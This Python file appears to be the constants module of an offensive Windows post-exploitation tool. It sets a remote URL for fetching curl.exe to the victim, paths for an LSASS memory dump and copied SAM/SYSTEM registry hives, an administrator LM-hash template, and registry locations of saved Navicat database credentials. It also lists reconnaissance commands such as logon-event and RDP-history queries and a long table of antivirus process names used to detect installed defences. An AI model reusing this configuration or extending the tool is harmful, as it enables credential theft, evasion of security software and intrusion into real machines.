# -*- coding: utf-8 -*-

import tempfile
import random
import time
import os
import getpass


tmp = tempfile.gettempdir()
date = time.strftime("%d%m%Y_%H%M%S")
file = "attack"

class constant():
    # pyurl = "https://www.yunzhijia.com/microblog/filesvr/5e89bca6b54c8d14ea9061a7/nnn.exe"
    curl_url = 'https://www.yunzhijia.com/microblog/filesvr/5e89d52aa37259795a86e7e4/curl.exe'
    # pyexe = "wpsd.exe"
    # pyname = "mimi.json"
    upload_dir = tempfile.gettempdir() + os.sep + file
    dump_name = upload_dir + os.sep + "lsass.dmp"
    cmdlist = [
        r'reg query "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers"',
        'route print',
        'net session',
        'arp -a',
        r'type C:\windows\system32\drivers\etc\hosts',
        'ipconfig /all',
        'netstat -na',
        'wevtutil qe security /rd:true /f:text /q:"Event[System[(EventID=4624 or EventID=4625) and TimeCreated[timediff(@SystemTime) <= 4449183132]]]"']
    drive = 'C'
    user = getpass.getuser()
    temp_ = str((random.randrange(100,500,3)))
    tmp_name = upload_dir + os.sep + "update.log"
    tmp_name_ = upload_dir + os.sep + "drive.txt"
    tmp_name__ = upload_dir + os.sep + "host.txt"
    file_name_results = 'credentials_{current_time}'.format(
        current_time=date
    )  # The extension is added depending on the user output choice
    regs = {
    'MySQL Server' : 'Software\\PremiumSoft\\Navicat\\Servers',
    'MariaDB Server' : 'Software\\PremiumSoft\\NavicatMARIADB\\Servers',
    'MongoDB Server' : 'Software\\PremiumSoft\\NavicatMONGODB\\Servers',
    'MSSQL Server' : 'Software\\PremiumSoft\\NavicatMSSQL\\Servers',
    'OracleSQL Server' : 'Software\\PremiumSoft\\NavicatOra\\Servers',
    'PostgreSQL Server' : 'Software\\PremiumSoft\\NavicatPG\\Servers',
    'SQLite Server' : 'Software\\PremiumSoft\\NavicatSQLite\\Servers'
}
    profile = {
        'APPDATA': drive + ":\\Users\\" + user + "\\AppData\\Roaming\\",
        'USERPROFILE': u'{drive}:\\Users\\{user}\\',
        'HOMEDRIVE': u'{drive}:',
        'HOMEPATH': u'{drive}:\\Users\\{user}',
        'ALLUSERSPROFILE': drive + ":\\ProgramData",
        'COMPOSER_HOME': u'{drive}:\\Users\\{user}\\AppData\\Roaming\\Composer\\',
        'LOCALAPPDATA': drive + ":\\Users\\" + user + "\\AppData\\Local\\",
    }
    system_dpapi = None
    username = "administrator"
    lmhash = "aad3b435b51404eeaad3b435b51404ee:{}"
    keepass = {}
    hives = {
        'system': os.path.join(
            upload_dir + os.sep + "system.hive"),
        'sam': os.path.join(
            upload_dir + os.sep + "sam.hive"),
        # 'security': os.path.join(
        #     tmp,
        #     ''.join([random.choice(string.ascii_lowercase) for x in range(0, random.randint(6, 12))])),
    }
    av_json = {
    "360tray.exe": "360安全卫士-实时保护",
    "360safe.exe": "360安全卫士-主程序",
    "ZhuDongFangYu.exe": "360安全卫士-主动防御",
    "360sd.exe": "360杀毒",
    "a2guard.exe": "a-squared杀毒",
    "ad-watch.exe": "Lavasoft杀毒",
    "cleaner8.exe": "The Cleaner杀毒",
    "vba32lder.exe": "vb32杀毒",
    "MongoosaGUI.exe": "Mongoosa杀毒",
    "CorantiControlCenter32.exe": "Coranti2012杀毒",
    "F-PROT.exe": "F-Prot AntiVirus",
    "CMCTrayIcon.exe": "CMC杀毒",
    "K7TSecurity.exe": "K7杀毒",
    "UnThreat.exe": "UnThreat杀毒",
    "CKSoftShiedAntivirus4.exe": "Shield Antivirus杀毒",
    "AVWatchService.exe": "VIRUSfighter杀毒",
    "ArcaTasksService.exe": "ArcaVir杀毒",
    "iptray.exe": "Immunet杀毒",
    "PSafeSysTray.exe": "PSafe杀毒",
    "nspupsvc.exe": "nProtect杀毒",
    "SpywareTerminatorShield.exe": "SpywareTerminator杀毒",
    "BKavService.exe": "Bkav杀毒",
    "MsMpEng.exe": "Microsoft Security Essentials",
    "SBAMSvc.exe": "VIPRE",
    "ccSvcHst.exe": "Norton杀毒",
    "f-secure.exe": "冰岛",
    "avp.exe": "Kaspersky",
    "KvMonXP.exe": "江民杀毒",
    "RavMonD.exe": "瑞星杀毒",
    "Mcshield.exe": "Mcafee",
    "Tbmon.exe": "Mcafee",
    "Frameworkservice.exe": "Mcafee",
    "egui.exe": "ESET NOD32",
    "ekrn.exe": "ESET NOD32",
    "eguiProxy.exe": "ESET NOD32",
    "kxetray.exe": "金山毒霸",
    "knsdtray.exe": "可牛杀毒",
    "TMBMSRV.exe": "趋势杀毒",
    "avcenter.exe": "Avira(小红伞)",
    "avguard.exe": "Avira(小红伞)",
    "avgnt.exe": "Avira(小红伞)",
    "sched.exe": "Avira(小红伞)",
    "ashDisp.exe": "Avast网络安全",
    "rtvscan.exe": "诺顿杀毒",
    "ccapp.exe": "Symantec Norton",
    "NPFMntor.exe": "Norton杀毒软件相关进程",
    "ccSetMgr.exe": "赛门铁克",
    "ccRegVfy.exe": "Norton杀毒软件自身完整性检查程序",
    "vptray.exe": "Norton病毒防火墙-盾牌图标程序",
    "ksafe.exe": "金山卫士",
    "QQPCRTP.exe": "QQ电脑管家",
    "Miner.exe": "流量矿石",
    "AYAgent.exe": "韩国胶囊",
    "patray.exe": "安博士",
    "V3Svc.exe": "安博士V3",
    "avgwdsvc.exe": "AVG杀毒",
    "QUHLPSVC.exe": "QUICK HEAL杀毒",
    "mssecess.exe": "微软杀毒",
    "SavProgress.exe": "Sophos杀毒",
    "fsavgui.exe": "F-Secure杀毒",
    "vsserv.exe": "比特梵德",
    "remupd.exe": "熊猫卫士",
    "FortiTray.exe": "飞塔",
    "safedog.exe": "安全狗",
    "parmor.exe": "木马克星",
    "Iparmor.exe.exe": "木马克星",
    "beikesan.exe": "贝壳云安全",
    "KSWebShield.exe": "金山网盾",
    "TrojanHunter.exe": "木马猎手",
    "GG.exe": "巨盾网游安全盾",
    "adam.exe": "绿鹰安全精灵",
    "AST.exe": "超级巡警",
    "ananwidget.exe": "墨者安全专家",
    "AVK.exe": "GData",
    "avg.exe": "AVG Anti-Virus",
    "spidernt.exe": "Dr.web",
    "avgaurd.exe": "Avira Antivir",
    "vsmon.exe": "ZoneAlarm",
    "cpf.exe": "Comodo",
    "outpost.exe": "Outpost Firewall",
    "rfwmain.exe": "瑞星防火墙",
    "kpfwtray.exe": "金山网镖",
    "FYFireWall.exe": "风云防火墙",
    "MPMon.exe": "微点主动防御",
    "pfw.exe": "天网防火墙",
    "S.exe": "在抓鸡",
    "1433.exe": "在扫1433",
    "DUB.exe": "在爆破",
    "ServUDaemon.exe": "发现S-U",
    "BaiduSdSvc.exe": "百度杀毒-服务进程",
    "BaiduSdTray.exe": "百度杀毒-托盘进程",
    "BaiduSd.exe": "百度杀毒-主程序",
    "SafeDogGuardCenter.exe": "安全狗",
    "safedogupdatecenter.exe": "安全狗",
    "safedogguardcenter.exe": "安全狗",
    "SafeDogSiteIIS.exe": "安全狗",
    "SafeDogTray.exe": "安全狗",
    "SafeDogServerUI.exe": "安全狗",
    "D_Safe_Manage.exe": "D盾",
    "d_manage.exe": "D盾",
    "yunsuo_agent_service.exe": "云锁",
    "yunsuo_agent_daemon.exe": "云锁",
    "HwsPanel.exe": "护卫神",
    "hws_ui.exe": "护卫神",
    "hws.exe": "护卫神",
    "hwsd.exe": "护卫神",
    "HipsTray.exe": "火绒",
    "HipsDaemon.exe": "火绒",
    "wsctrlsvc.exe": "火绒",
    "usysdiag.exe": "火绒",
    "WEBSCANX.EXE": "网络病毒克星",
    "SPHINX.EXE": "SPHINX防火墙",
    "bddownloader.exe": "百度卫士",
    "baiduansvx.exe": "百度卫士-主进程",
    "AvastUI.exe": "Avast!5主程序",

}


